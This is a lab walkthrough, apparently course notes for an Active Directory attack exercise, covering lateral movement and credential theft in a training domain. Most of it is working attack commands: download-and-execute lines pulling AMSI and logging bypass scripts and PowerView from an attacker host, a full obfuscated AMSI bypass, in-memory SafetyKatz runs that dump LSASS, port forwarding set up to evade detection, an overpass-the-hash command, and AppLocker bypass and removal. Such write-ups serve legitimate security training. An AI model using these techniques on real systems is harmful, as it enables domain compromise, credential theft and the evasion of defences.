# Learning Objtetive 7

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

* dcorp-mgmt - Process using svcadmin as service account
* dcorp-mgmt - NTLM hash of svcadmin account
* dcorp-adminsrv - We tried to extract clear-text credentials for scheduled tasks from? Flag value is like lsass, registry, credential vault etc.
* dcorp-adminsrv - NTLM hash of srvadmin extracted from dcorp-adminsrv
* dcorp-adminsrv - NTLM hash of websvc extracted from dcorp-adminsrv
* dcorp-adminsrv - NTLM hash of appadmin extracted from dcorp-adminsrv

***

## Identify a machine where Domain Admin session is available

We have access to two domain users - student113 and ciadmin and administrative access to dcorpadminsrv machine. User hunting has not been fruitful as studentx. We got a reverse shell on dcorp-ci as ciadmin by abusing Jenkins.

> * **student113** → usuario de dominio normal
> * **ciadmin** → obtenido mediante **reverse shell en `dcorp-ci` explotando Jenkins**
> * **admin local en `dcorp-adminsrv`** (de ejercicios anteriores)

### Enumeration using Invoke-SessionHunter (Session Hunting - Lateral Movement)&#xD;

We can use `Invoke-SessionHunter.ps1` from the student VM to list sessions on all the remote machines. The script connects to Remote Registry service on remote machines that runs by default. Also, admin access is not required on the remote machines.

#### Invisi-Shell

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\Invoke-SessionHunter.ps1
```

#### Without target

> Enumrate all computers/server of domain

<pre><code>Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access

HostName       UserSession         Access
--------       -----------         ------
dcorp-appsrv   dcorp\appadmin       False
dcorp-ci       dcorp\ciadmin        False
dcorp-mgmt     dcorp\mgmtadmin      False
dcorp-mssql    dcorp\sqladmin       False
dcorp-dc       dcorp\Administrator  False
dcorp-mgmt     dcorp\svcadmin       False
us-dc          US\Administrator     False
<a data-footnote-ref href="#user-content-fn-1">dcorp-adminsrv dcorp\appadmin        True</a>
<a data-footnote-ref href="#user-content-fn-1">dcorp-adminsrv dcorp\srvadmin        True</a>
<a data-footnote-ref href="#user-content-fn-1">dcorp-adminsrv dcorp\websvc          True</a>
</code></pre>

To make the above enumeration more opsec friendly and avoid triggering tools like MDI, we can query specific target machines.&#x20;

Now, we need to create 'servers.txt' saving the true hostnames and use the below command:

#### With targets

> Using unil the list of target, dont search computers/servers into domain (User PowerView)
>
> ```
> Get-DomainComputer | select -ExpandProperty dnshostname > C:\AD\Tools\servers.txt
> ```

<pre><code>Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname,UserSession,Access

HostName       UserSession     Access
--------       -----------     ------
DCORP-APPSRV   dcorp\appadmin   False
DCORP-CI       dcorp\ciadmin    False
DCORP-MGMT     dcorp\mgmtadmin  False
DCORP-MSSQL    dcorp\sqladmin   False
DCORP-MGMT     dcorp\svcadmin   False
<a data-footnote-ref href="#user-content-fn-1">DCORP-ADMINSRV dcorp\appadmin    True</a>
<a data-footnote-ref href="#user-content-fn-1">DCORP-ADMINSRV dcorp\srvadmin    True</a>
<a data-footnote-ref href="#user-content-fn-1">DCORP-ADMINSRV dcorp\websvc      True</a>
</code></pre>

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Sweet! There is a <mark style="background-color:red;">domain admin (svcadmin) session on dcorp-mgmt server</mark>! We do not have access to the server but that comes later.

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

> We can see if this user is domain admin comparing it to BloodHound

***

## Enumeration using PowerView from the Jenkins Reverse Shell - Bypassing Security Controls

> We obtained a **reverse shell on `dcorp-ci` as the user `ciadmin`** by abusing a Jenkins job.\
> All the following steps will be performed **inside that reverse shell session**.
>
> From this shell, we start the **Active Directory enumeration phase** using PowerView.
>
> The goal is to **find machines where a Domain Admin has an active session**, which could later allow us to steal credentials or tokens.

&#x20;we first bypass some PowerShell security mechanisms to avoid detection.

### Bypass ScriptBlock Logging

> Info: Bypass Windows logs of PowerShell commands.
>
> Into (user RCE jenkings)

Upload the file sbloggingbypass.txt --->

```
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.113/sbloggingbypass.txt'))
```

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Bypass AMSI

> Info: AMSI scans scripts before execution.

Upload the file Amsi-Byp.txt to bypass the AMS after, it contains -->

```
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.113/Amsi-Byp.txt'))
```

> ```
> S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
> ```

<figure><img src="../../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Execute PowerView

Upload PoweView to execute commnads -->

<figure><img src="../../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.113/PowerView.ps1'))
```

Once we do all, Now run user hunting to find where Domain Admins are logged in -->

> ```
> user / admins
>         │
>         ▼
> logged into
>         │
>         ▼
> dcorp-mgmt (this machine)
> ```

<pre><code>Find-DomainUserLocation

UserDomain      : DCORP-MGMT
UserName        : Administrator
ComputerName    : dcorp-mgmt.dollarcorp.moneycorp.local
IPAddress       : 172.16.4.44
SessionFrom     :
SessionFromName :
LocalAdmin      :

UserDomain      : dcorp
<a data-footnote-ref href="#user-content-fn-1">UserName        : svcadmin</a>
<a data-footnote-ref href="#user-content-fn-1">ComputerName    : dcorp-mgmt.dollarcorp.moneycorp.local</a>
IPAddress       : 172.16.4.44
SessionFrom     :
SessionFromName :
LocalAdmin      :
</code></pre>

Great! There is a domain admin session on dcorp-mgmt server!&#x20;

> **ahora mismo hay una sesión cargada en memoria**.

Now, we can abuse this using winrs or PowerShell Remoting!

Use winrs to access dcorp-mgmt


Let's <mark style="background-color:yellow;">check if</mark> we can execute commands on dcorp-mgmt server with it user (ciadmin) and if the winrm port is open:

```
winrs -r:dcorp-mgmt cmd /c "set computername && set username"

COMPUTERNAME=DCORP-MGMT
USERNAME=ciadmin
```

> ciadmin → tiene acceso remoto a dcorp-mgmt
>
> ciadmin = Administrators (dcorp-mgmt) (porque para ejecutar comando debes ser local admin o pertenecer al grupo)

It\`s open and we are ciadmin so... we can execute commands too into this machine

We would now run SafetyKatz.exe =(versión modificada de Mimikatz que se usa para dumpear LSASS) on dcorp-mgmt to extract credentials from it. For that, we need to copy Loader.exe =(programa que **descarga y ejecuta otro binario en memoria)** on dcorp-mgmt. Let's download Loader.exe on dcorp-ci and copy it from there to dcorp-mgmt. This is to avoid any downloading activity on dcorp-mgmt.

> Remember upload SafetyKatz to the webshell

<figure><img src="../../../.gitbook/assets/image (3) (1) (1).png" alt="" width="302"><figcaption></figcaption></figure>

> ```
> [ Attacker VM ] 172.16.100.113
>         |
>         |  hosting tools (PowerView, SafetyKatz, bypass scripts)
>         |  reverse shell listener (nc)
>         v
> [ Jenkins server → dcorp-ci ] (reverse shell from Jenkins job abuse)
> User obtained: ciadmin
>         |
>         |  AMSI + ScriptBlockLogging bypass
>         |  Load PowerView
>         |  Find-DomainUserLocation
>         v
>     Domain Admin session discovered
>     svcadmin → dcorp-mgmt
>         |
>         |  test remote execution -->
>         |  --> winrs / PowerShell Remoting
>         v
> [ dcorp-mgmt ]
> Access confirmed as: ciadmin
>         |
>         |  create port forwarding
>         |  netsh portproxy
>         v
>     dcorp-mgmt:8080 → attacker:80
>         |
>         |  download tools through mgmt server
>         |  execute credential dumping
>         v
>    SafetyKatz / Mimikatz
>         |
>         v
>    Dump LSASS
>         |
>         v
>    Steal credentials of svcadmin (Domain Admin)
> ```

Run the following command on the shell of rever shell (ciadmin\dcorp-ci):

<figure><img src="../../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
iwr http://172.16.100.113/Loader.exe -OutFile C:\Users\Public\Loader.exe
```

Now, copy the Loader.exe to dcorp-mgmt:

```
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
## if it give us error us it -->
copy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
cmd /c copy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

<figure><img src="../../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Port Forwarding - Bypass Detections

Using winrs, add the following port forwarding on dcorp-mgmt to avoid detection on dcorp-mgmt:

```
 $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.113"
```

> Note: Please note that we have to use the $null variable to address output redirection issues.
>
> Remeber user the same port that your web server (:280)

### SafetyKatz in-memory using

To run SafetyKatz on dcorp-mgmt, we will download and execute it in-memory using the Loader. Run the following command on the reverse shell:

```
$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
```

<figure><img src="../../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (4) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

Sweet! We got credentials of svcadmin - a domain administrator. Note that svcadmin is used as a service account (see “Session” in the above output), so you can even get credentials in clear-text from lsasecrets!

***

## Use OverPass-the-Hash to replay svcadmin credentials

Finally, use OverPass-the-Hash to use svcadmin’s credentials.

Run the commands below from an elevated shell on the student VM to use Rubeus. Note that we can use whatever tool we want (Invoke-Mimi, SafetyKatz, Rubeus etc.):

> In us machine VM, run it how local admin privileges

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Into it new cmd try to access at the domain controller from the new process!

```
C:\Windows\system32> winrs -r:dcorp-dc cmd /c set username
USERNAME=svcadmin
```

> Note that we did not need to have direct access to `dcorp-mgmt` from the student VM.

### Abuse Derivative Local Admin

Now moving on to the next task, we need to escalate to domain admin using derivative local admin. Let’s find out the machines on which we have local admin privileges

> Remeber use a new invishell admin priv

```
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
```

<figure><img src="../../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

> We have local admin on the dcorp-adminsrv. You will notice that any attempt to run Loader.exe (to run SafetKatz from memory) results in error  ‘**This program is blocked by group policy. For more information, contact your system administrator**’. Any attempts to run Invoke-Mimi on dcorp-adminsrv results in errors about language mode. This could be because of an application allowlist on dcorp-adminsrv and we drop into a `Constrained Language Mode (CLM)` when using PSRemoting.

### Gaps in Applocker Policy

Let’s check if Applocker is configured on dcorp-adminsrv by querying registry keys. Note that we are assuming that reg.exe is allowed to execute:

```
winrs -r:dcorp-adminsrv cmd
```

```
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
```

<figure><img src="../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

Looks like Applocker is configured. After going through the policies, we can understand that Microsoft Signed binaries and scripts are allowed for all the users but nothing else. However, this particular rule is overly permissive!

First search the scripts and examine its at found something -->

```
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\
```

<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

```
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d
```

<figure><img src="../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

**A default rule is enabled that allows everyone to run scripts from the `C:\Program Files` folder!** We can also confirm this using PowerShell commands on dcrop-adminsrv. Run the below commands from a PowerShell session as studentx:

```
PS C:\Users\student113> Enter-PSSession dcorp-adminsrv

[dcorp-adminsrv]: PS C:\Users\studentx\Documents> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
```

> It confirm us that this ps be in restrictive mode.

Now execute this command to read the current enable rules -->

```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

<figure><img src="../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

Here, `Everyone` can run scripts from the ‘**Program Files**’ directory. That means, we can drop scripts in the Program Files directory there and execute them. Also, in the Constrained Language Mode, we cannot run scripts using dot sourcing (`. .\Invoke-TheKat.ps1`). So, we must modify `Invoke-TheKat.ps1` to include the function call in the script itself and transfer the modified script (Invoke-TheKatEx.ps1) to the target server.

### Create Invoke-TheKatEx-keys-stdX.ps1

* Create a copy of `Invoke-TheKat.ps1` and rename it to `Invoke-TheKatEx-keys-stdX.ps1` (where X is your student ID).
* Open `Invoke-TheKatEx-keys-stdX.ps1` in PowerShell ISE (Right click on it and click Edit).
* Add the below encoded value for `token-evasive-elevate` and `sekurlsa::evasive-ekeys` to the end of the file.

<figure><img src="../../../.gitbook/assets/image (548).png" alt=""><figcaption></figcaption></figure>

On student machine run the following command from a PowerShell session.&#x20;

> Note that it will take several minutes for the copy process to complete.

Share it to dcorp-adminsrv pc -->

> Remember user administrative shell + invisihell + powerview

```
PS C:\AD\Tools> Copy-Item C:\AD\Tools\Invoke-TheKatEx-keys-std113.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```

> The file `Invoke-MimiEx.ps1` is copied to the dcorp-adminsrv server.
>
> ```
> [dcorp-adminsrv]: PS C:\Program Files> ls
>
>     Directory: C:\Program Files
>
> [snip]
> -a----         11/28/2024  04:38 AM        3063603 Invoke-TheKatEx-keys-stdX.ps1
> ```

Now, run the modified mimikatz script.&#x20;

> Note that there is no dot sourcing here. It may take a couple of minutes for the script execution to complete:

```
.\Invoke-TheKatEx-keys-std113.ps1
```

<figure><img src="../../../.gitbook/assets/image (549).png" alt=""><figcaption></figcaption></figure>

<mark style="background-color:orange;">Here we find the credentials of the</mark> <mark style="background-color:orange;"></mark><mark style="background-color:orange;">`dcorp-adminsrv$`</mark><mark style="background-color:orange;">,</mark> <mark style="background-color:orange;"></mark><mark style="background-color:orange;">`appadmin`</mark> <mark style="background-color:orange;"></mark><mark style="background-color:orange;">and</mark> <mark style="background-color:orange;"></mark><mark style="background-color:orange;">`websvc`</mark> <mark style="background-color:orange;"></mark><mark style="background-color:orange;">users.</mark>

### Create Invoke-TheKatEx-vault-stdx.ps1

There are other places to look for credentials. Let’s modify `Invoke-TheKatEx` and look for credentials from the Windows Credential Vault. On the student VM:

* Create a copy of `Invoke-TheKat.ps1` and rename it to `Invoke-TheKatEx-vault-stdX.ps1` (where **x** is your student ID).
* Open `Invoke-TheKatEx-vault-stdX.ps1` in PowerShell ISE (Right click on it and click Edit).
* Replace `Invoke-TheKat -Command '"sekurlsa::ekeys"'` that we added earlier with `Invoke-Mimi -Command '"token::evasive-elevate" "vault::cred /patch"'`.

Copy `Invoke-MimiEx-vault-stdX.ps1` to `dcorp-adminsrv` and run it.&#x20;

> Remember that it will take several minutes for the copy process to complete.

```
Copy-Item C:\AD\Tools\Invoke-TheKatEx-vault-std113.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```

Now, run the script. Again, it may take a couple of minutes for the script execution to complete:

<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Sweet! We got credentials for the `srvadmin` user in clear-text!&#x20;

Start a cmd process using runas. Run the below command from an elevated shell:

```
runas /user:dcorp\srvadmin /netonly cmd
```

> With it we connect with the user and pass of srvadmin buuttt!! it give us a cmd with us user student and the same machine but with the red/priv of srvadmin user
>
> "/netonly" = ✔ no cambia tu sesión\
> &#x20;                    ✔ no necesitas logon interactivo\
> &#x20;                    ✔ no crea logon tipo 2\
> &#x20;                    ✔ es más OPSEC friendly

The new process that starts has srvadmin privileges. Check if srvadmin has admin privileges on any other machine.

Use invishell + seach remote admin access -->

> Remember user PowerView!

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerView.ps1
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose
```

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

We can see how we have local admin access on the `dcorp-mgmt` server as srvadmin and we already know a session of svcadmin is present on that machine.

Let’s use SafetyKatz to extract credentials from the machine.&#x20;

> Run the below commands from the process running as srvadmin terminal

Copy the Loader.exe to `dcorp-mgmt`:

```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Now extract the credentials:

> Remember to have the Safetykatz.exe available in a web server to download it and exuecute in memorie at the same ttime with the command.
>
> Remember to have too the portforwarding do, but!! for this case, we can use directly us ip and webserver

```
winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://172.16.100.113:80/SafetyKatz.exe "sekurlsa::Evasive-keys" "exit"
```

<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

### Disable Applocker on dcorp-adminsrv by modifying GPO

> Recall that we enumerated that studentx has Full Control/Generic All on the Applocked Group Policy

Let’s make changes to the Group Policy and disable Applocker on dcorp-adminsrv.

We need the Group Policy Management Console for this. As the student VM is a Server 2022 machine, we can install it using the following steps: `Open Server Manager -> Add Roles and Features -> Next -> Features -> Check Group Policy Management -> Next -> Install`

<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

After the installation is completed, start the gpmc.&#x20;

Start the gpmc. We need to start a process as studetntX using runas, otherwise gpmc doesn’t get the user context. Run the below command from an elevated shell:

Run the below command from an elevated shell:

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

<pre><code><strong>PS C:\Users\student113> runas /user:dcorp\studentx /netonly cmd
</strong></code></pre>

<mark style="background-color:yellow;">Now! In the fristly shell when we execute runas, strat the gpmc</mark> -->

```
PS C:\Users\student113> gpmc.msc
```

> In gpmc, expand `Forest -> Domains -> dollarcorp.moneycorp.local -> Applocked -> Right click on the Applocker policy` and click on Edit

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

> In the new window, `Expand Policies -> Windows Settings -> Security Settings -> Application Control Policies -> Applocker`

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Start looking at each category of the Applocker policies. You will find out that there are two restrictions.&#x20;

> Recall that we have already enumerated this earlier.

1. In the ‘**Executable Rules**’, ‘**Everyone**’ is allowed to run Microsoft signed binaries.
2. In the ‘**Script Rules**’, ‘**Everyone**’ can run Microsoft signed scripts from any location and two default rules where ‘**Everyone**’ can run Microsoft signed scripts from `C:\Windows` and `C:\Program Files` folders.

As we already abused the default rules for Scripts, let’s go for Executable Rules. Right Click on the rule and delete it.

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

> Now, we can either wait for the Group Policy refresh or force an update on the dcorp-adminsrv machine.&#x20;

Let’s go for the later using the following commands as studentx:

```
winrs -r:dcorp-adminsrv cmd
## Then
gpupdate /force
```

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Exit of the current session and copy Loader on the machine and use it to run SafetyKatz!!!

```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-adminsrv\C$\Users\Public\Loader.exe
winrs -r:dcorp-adminsrv cmd
```

Now use a portforwarding to mask a little us ip -->

```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x
```

Then of it, execute -->

```
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
```

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

Sweet! We were able to disable Applocker.&#x20;

> Please note that modification to GPO is not OPSEC safe but still commonly abuse by threat actors.



[^1]: 
